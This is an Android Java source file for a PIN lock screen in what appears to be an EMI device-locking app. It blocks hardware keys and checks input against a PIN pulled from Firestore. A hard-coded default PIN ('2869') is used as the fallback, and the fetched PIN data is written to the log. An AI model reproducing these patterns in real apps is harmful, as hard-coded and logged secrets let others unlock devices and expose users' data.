package com.emi.systemconfiguration;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;

import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.EventListener;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.FirebaseFirestoreException;

import java.lang.reflect.Method;
import java.text.DecimalFormat;
import java.text.NumberFormat;
import java.util.List;

import butterknife.BindViews;
import butterknife.ButterKnife;
import butterknife.OnClick;

public class LockScreen extends AppCompatActivity {


    @BindViews({R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6,
            R.id.btn7, R.id.btn8, R.id.btn9, R.id.btn_clear})
    List<View> btnNumPads;

    @BindViews({R.id.dot_1, R.id.dot_2, R.id.dot_3, R.id.dot_4})
    List<ImageView> dots;

    private static String TRUE_CODE = "2869";
    private static final int MAX_LENGHT = 4;
    private String codeString = "";

    // creating a variable
    // for firebasefirestore.
    private FirebaseFirestore db;


    private BackgroundService backgroundService;
    Intent mServiceIntent;

    public ComponentName mDeviceAdmin;
    public DevicePolicyManager mDPM;
    public static final int REQUEST_CODE =0;

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock_screen);
        ButterKnife.bind(this);
        // getting our instance
        // from Firebase Firestore.
        db = FirebaseFirestore.getInstance();



        checkPin();

        //    startLockTask();

    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {

        switch( event.getKeyCode() ) {
            case KeyEvent.KEYCODE_MENU:
                return true;
            case KeyEvent.KEYCODE_VOLUME_UP:
                return true;

            case KeyEvent.KEYCODE_VOLUME_DOWN:
                return true;

            case KeyEvent.KEYCODE_BACK:
                return true;

            case KeyEvent.KEYCODE_HOME:
                return  true;

            case KeyEvent.KEYCODE_POWER:
                return  true;

            case KeyEvent.KEYCODE_MOVE_HOME:
                return  true;
            default:
                return super.dispatchKeyEvent(event);
        }
    }

    @OnClick(R.id.btn_clear)
    public void onClear() {
        if (codeString.length() > 0) {
            //remove last character of code
            codeString = removeLastChar(codeString);

            //update dots layout
            setDotImagesState();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    @OnClick({R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6,
            R.id.btn7, R.id.btn8, R.id.btn9})

    public void onClick(Button button) {
        getStringCode(button.getId());
        if (codeString.length() == MAX_LENGHT) {
            if (codeString.equals(TRUE_CODE)) {
                Toast.makeText(this, "Code is right", Toast.LENGTH_SHORT).show();
//                stopService(new Intent(getApplicationContext(), BgService3.class))
                 setIsPass();
//                countDown();

                finish();
            } else {
                Toast.makeText(this, "Wrong Pass code", Toast.LENGTH_SHORT).show();
                //vibrate the dots layout
                shakeAnimation();

            }
        } else if (codeString.length() > MAX_LENGHT){

            //reset the input code
            codeString = "";
            getStringCode(button.getId());
        }
        setDotImagesState();
    }


    private void shakeAnimation() {
        Animation shake = AnimationUtils.loadAnimation(this, R.anim.shake_anim);
        findViewById(R.id.dot_layout).startAnimation(shake);
        Toast.makeText(this, "Wrong Password", Toast.LENGTH_SHORT).show();
    }

    private void getStringCode(int buttonId) {
        switch (buttonId) {
            case R.id.btn0:
                codeString += "0";
                break;
            case R.id.btn1:
                codeString += "1";
                break;
            case R.id.btn2:
                codeString += "2";
                break;
            case R.id.btn3:
                codeString += "3";
                break;
            case R.id.btn4:
                codeString += "4";
                break;
            case R.id.btn5:
                codeString += "5";
                break;
            case R.id.btn6:
                codeString += "6";
                break;
            case R.id.btn7:
                codeString += "7";
                break;
            case R.id.btn8:
                codeString += "8";
                break;
            case R.id.btn9:
                codeString += "9";
                break;
            default:
                break;
        }
    }

    private void setDotImagesState() {
        for (int i = 0; i < codeString.length(); i++) {
            dots.get(i).setImageResource(R.drawable.dot_enable);
        }
        if (codeString.length()<4) {
            for (int j = codeString.length(); j<4; j++) {
                dots.get(j).setImageResource(R.drawable.dot_disable);
            }
        }
    }

    private String removeLastChar(String s) {
        if (s == null || s.length() == 0) {
            return s;
        }
        return s.substring(0, s.length() - 1);
    }

    private void setIsPass() {
        SharedPreferences.Editor editor = getSharedPreferences("PASS_CODE", MODE_PRIVATE).edit();
        editor.putBoolean("is_pass", true);
        editor.apply();
    }

    private void checkPin()  {
        Boolean  isconnected=MainActivity.isConnected(getApplicationContext());

        if (isconnected) {
            String deviceId = MainActivity.getDeviceId(this);
            DocumentReference documentReference = db.collection("users").document(deviceId);
            documentReference.addSnapshotListener(new EventListener<DocumentSnapshot>() {
                @Override
                public void onEvent(@Nullable DocumentSnapshot value, @Nullable FirebaseFirestoreException error) {
                    if (error != null) {
                        // this method is called when error is not null
                        // and we gt any error
                        // in this cas we are displaying an error message.
                        Log.d("Error is","Error found" + error);

                        return;
                    }
                    if (value != null && value.exists()) {
                        TRUE_CODE = value.getData().get("customer_pincode").toString();
                        Log.d("Found the", value.getData().toString());
                    }
                }
            });
        } else {
            Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();
        }
//        RegistrationAcitivity registrationAcitivity = new RegistrationAcitivity();
//        Method m = RegistrationAcitivity.class.getDeclaredMethod("activeUser", Context.class);
//        //m.invoke(d);// throws java.lang.IllegalAccessException
//        m.setAccessible(true);// Abracadabra
//        m.invoke(registrationAcitivity);// now its OK
//        Log.d("Pin is","sdbdfbdf");

    }

    private  void countDown(){
        new CountDownTimer(30000, 1000){
            public void onTick(long millisUntilFinished) {
                // Used for formatting digit to be in 2 digits only
                NumberFormat f = new DecimalFormat("00");
                long hour = (millisUntilFinished / 3600000) % 24;
                long min = (millisUntilFinished / 60000) % 60;
                long sec = (millisUntilFinished / 1000) % 60;
                Log.d("Count DOWN",f.format(hour) + ":" + f.format(min) + ":" + f.format(sec));
                backgroundService = new BackgroundService();
                mServiceIntent = new Intent(getApplicationContext(), backgroundService.getClass());
                stopService(mServiceIntent);
//                startActivity(new Intent(android.provider.Settings.ACTION_SETTINGS));

        }
            // When the task is over it will print 00:00:00 there
            public void onFinish() {
//                textView.setText("00:00:00");
                Log.d("Count DOWN","finished");
                backgroundService = new BackgroundService();
                mServiceIntent = new Intent(getApplicationContext(), backgroundService.getClass());
                startService(mServiceIntent);
            }
        }.start();
    }



}
